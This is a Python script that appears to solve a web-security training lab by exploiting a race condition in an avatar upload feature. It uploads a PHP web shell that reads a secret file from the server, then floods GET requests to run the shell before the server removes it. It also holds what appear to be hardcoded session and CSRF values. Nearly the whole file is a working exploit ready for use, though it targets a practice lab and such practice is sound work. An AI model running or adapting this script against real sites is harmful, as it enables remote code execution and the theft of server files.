import asyncio
import httpx

# Target URLs
TARGET_URL_POST = "https://0a9b009604cb8bee81a68ef500510081.web-security-academy.net/my-account/avatar"
TARGET_URL_GET = "https://0a9b009604cb8bee81a68ef500510081.web-security-academy.net/files/avatars/rcewebshell.php"

# Form data - use a simpler PHP payload like in the solution
files = {
    "avatar": ("rcewebshell.php", b"<?php echo file_get_contents('/home/carlos/secret'); ?>", "application/x-php")
}

data = {
    "user": "wiener",
    "csrf": "C8eThUeCOSzSkRsc9XWlaQJgZSlkVDaF"
}

# Headers
post_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Cookie": "session=MV8n7SrUFHZ5i4Nm2Ay2zi2kMUVJGadl",
    "Referer": "https://0a9b009604cb8bee81a68ef500510081.web-security-academy.net/my-account"
}

get_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Cookie": "session=MV8n7SrUFHZ5i4Nm2Ay2zi2kMUVJGadl",
    "Accept": "image/avif,image/webp,*/*"
}


async def execute_race_attack():
    # Use a single client with a long timeout
    timeout = httpx.Timeout(30.0)
    limits = httpx.Limits(max_connections=20, max_keepalive_connections=20)

    async with httpx.AsyncClient(timeout=timeout, limits=limits) as client:
        # Prepare but don't send the POST request
        post_req = client.build_request(
            "POST",
            TARGET_URL_POST,
            files=files,
            data=data,
            headers=post_headers
        )

        # Prepare GET requests
        get_reqs = [
            client.build_request("GET", TARGET_URL_GET, headers=get_headers)
            for _ in range(10)
        ]

        # Execute POST request
        post_task = asyncio.create_task(client.send(post_req))

        # Small delay to ensure POST starts processing
        await asyncio.sleep(0.05)

        # Launch GET requests in quick succession
        get_tasks = [asyncio.create_task(client.send(req)) for req in get_reqs]

        # Wait for all requests to complete
        all_tasks = [post_task] + get_tasks
        responses = await asyncio.gather(*all_tasks, return_exceptions=True)

        # Check results
        post_response = responses[0]
        if isinstance(post_response, Exception):
            print(f"POST failed: {post_response}")
        else:
            print(f"POST status: {post_response.status_code}")

        # Check GET responses
        for i, resp in enumerate(responses[1:]):
            if isinstance(resp, Exception):
                print(f"GET request {i} failed: {resp}")
            else:
                print(f"GET request {i} status: {resp.status_code}")
                if resp.status_code == 200:
                    print(f"Success! Content: {resp.text}")
                    break

if __name__ == "__main__":
    asyncio.run(execute_race_attack())
